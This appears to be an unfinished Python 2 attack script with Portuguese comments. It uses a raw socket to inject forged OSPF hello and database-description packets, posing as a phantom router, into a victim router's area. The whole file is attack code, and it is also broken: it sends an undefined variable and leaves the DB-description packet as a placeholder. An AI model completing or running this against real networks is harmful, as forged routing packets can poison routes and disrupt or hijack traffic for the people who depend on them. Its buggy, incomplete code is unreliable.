#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import sys

from modules.ip import IP
from modules.ethernet import Ethernet
from modules.ospf import *


IF_NAME = 'enp4s0'

PHANTON_ID = '9999'

# area configurada no roteador OSPF vitima 
AREA_ID = '9999'

AUTH_TYPE = 0
AUTH_DATA = 0


def main():
    """
    Main Method
    """
    try:
        s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((IF_NAME, 0))
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    hello_ospf = OSPF(2, PHANTON_ID, AREA_ID, AUTH_TYPE, AUTH_DATA).hello_packet()

    # Envia hello com a informação da vítima
    s.send(hello)
    
    # Vazio, apenas com flag de inicialização, flag de mestre, flag MS(more segments, vai mandar mais segmentos)
    # tem q incluir um nro de sequencia inicial
    for i in range (0,5):
        # tem q incluir o nro de sequencia, que vai ser o i
        db_desc_package = ... 
        s.send(db_desc_package)

    
    
    



if __name__ == '__main__':
    main()
